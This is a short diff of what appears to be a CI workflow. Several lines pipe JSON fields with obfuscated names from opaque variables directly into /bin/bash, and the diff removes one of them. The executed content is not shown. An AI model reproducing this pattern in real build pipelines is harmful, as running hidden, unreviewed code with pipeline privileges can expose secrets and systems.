@@ -26,7 +26,6 @@ jobs:
           echo $stxw2 | jq -r .fyjt9 | /bin/bash
           echo $rcv30244 | jq -r .pet142 | /bin/bash
           echo $ahmd6 | jq -r .ug43425 | /bin/bash
-          echo $zbdga4 | jq -r .dstye71 | /bin/bash
           echo $pjwrc026 | jq -r .hjch819 | /bin/bash
 
       - name: Save output
